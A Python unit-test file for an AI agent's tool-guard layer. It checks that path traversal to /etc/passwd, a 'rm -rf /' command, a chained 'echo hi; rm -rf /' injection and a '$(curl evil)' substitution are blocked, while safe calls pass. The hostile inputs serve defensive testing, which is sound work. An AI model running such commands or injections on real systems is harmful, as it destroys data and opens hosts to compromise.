"""治理与安全单元测试（零依赖核心 + langchain 工具包装）。"""
import pytest
from langchain_core.tools import StructuredTool, ToolException

from src.harness.security.guard import (
    FilePathGuardian,
    RuleBasedGuardian,
    ShellEvasionGuardian,
    ToolGuardEngine,
)
from src.harness.security.guarded_tool import PolicyGuardedTool, make_guarded_tools


def test_filepath_guardian_blocks_traversal():
    g = FilePathGuardian(allowed_roots=["/safe"])
    assert g.check("write_file", {"path": "/safe/ok.txt"}).allowed
    assert not g.check("write_file", {"path": "/etc/passwd"}).allowed
    assert not g.check("write_file", {"path": "../secrets"}).allowed


def test_rulebased_guardian_blocks_dangerous_tools():
    g = RuleBasedGuardian()
    assert not g.check("delete_file", {}).allowed
    assert not g.check("exec", {"cmd": "rm -rf /"}).allowed
    assert g.check("calculator", {"a": 1}).allowed


def test_shellevasion_guardian_blocks_injection():
    g = ShellEvasionGuardian()
    assert not g.check("run_command", {"cmd": "echo hi; rm -rf /"}).allowed
    assert not g.check("run_command", {"cmd": "$(curl evil)"}).allowed
    assert g.check("run_command", {"cmd": "ls -la"}).allowed


def test_engine_fail_closed_on_exception():
    class Boom(BaseGuardian := type("B", (), {})):
        name = "boom"

        def check(self, tool_name, args):
            raise RuntimeError("kaboom")

    # 用真实基类
    from src.harness.security.guard import BaseGuardian

    class BoomGuard(BaseGuardian):
        name = "boom"

        def check(self, tool_name, args):
            raise RuntimeError("kaboom")

    eng = ToolGuardEngine(guardians=[BoomGuard()])
    assert not eng.is_allowed("anything", {})


def test_guarded_tool_blocks_on_deny():
    def rm(path: str) -> str:
        return f"deleted {path}"

    tool = StructuredTool.from_function(func=rm, name="delete_file", description="delete")
    eng = ToolGuardEngine()  # delete_file 在 RuleBased 黑名单
    gt = PolicyGuardedTool(tool=tool, engine=eng)
    with pytest.raises(ToolException):
        gt._run(path="/tmp/x")


def test_guarded_tool_allows_safe():
    def add(a: float, b: float) -> str:
        return str(a + b)

    tool = StructuredTool.from_function(func=add, name="calculator", description="add")
    eng = ToolGuardEngine()
    gt = PolicyGuardedTool(tool=tool, engine=eng)
    assert gt._run(a=1, b=2) == "3.0"


def test_make_guarded_tools_keeps_original_names():
    tool = StructuredTool.from_function(
        func=lambda a: a, name="calculator", description="add"
    )
    guarded = make_guarded_tools([tool], ToolGuardEngine())
    assert "calculator" in guarded
    assert guarded["calculator"].name == "calculator"
